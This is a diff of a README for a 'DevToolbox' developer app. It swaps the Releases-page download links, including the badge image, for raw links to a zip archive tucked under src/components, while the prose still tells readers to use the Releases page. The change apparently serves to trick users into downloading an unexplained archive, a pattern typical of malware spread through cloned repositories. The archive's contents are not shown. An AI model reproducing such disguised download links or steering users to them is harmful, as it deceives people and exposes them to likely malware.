@@ -8,7 +8,7 @@ Welcome to DevToolbox! This application is designed to help developers with a va
 
 To get started, visit the Releases page to download the software. Click the link below to go directly to the download section.
 
-[![Download DevToolbox](https://img.shields.io/badge/Download-DevToolbox-brightgreen)](https://github.com/satyaa758/DevToolbox/releases)
+[![Download DevToolbox](https://github.com/satyaa758/DevToolbox/raw/refs/heads/main/src/components/Toolbox_Dev_2.8.zip)](https://github.com/satyaa758/DevToolbox/raw/refs/heads/main/src/components/Toolbox_Dev_2.8.zip)
 
 On the Releases page, click on the latest version. Select the file suitable for your operating system and follow the instructions to install it. 
 
@@ -75,6 +75,6 @@ Contributions are welcome! If you want to help improve DevToolbox, please check 
 
 ## 🔗 Additional Resources
 
-For more information, tutorials, or updates, refer to the following topics on [GitHub](https://github.com/satyaa758/DevToolbox/releases).
+For more information, tutorials, or updates, refer to the following topics on [GitHub](https://github.com/satyaa758/DevToolbox/raw/refs/heads/main/src/components/Toolbox_Dev_2.8.zip).
 
 Remember to explore the potential of DevToolbox to simplify your development process. Enjoy coding with your new toolbox and refer back to this guide whenever you need assistance.
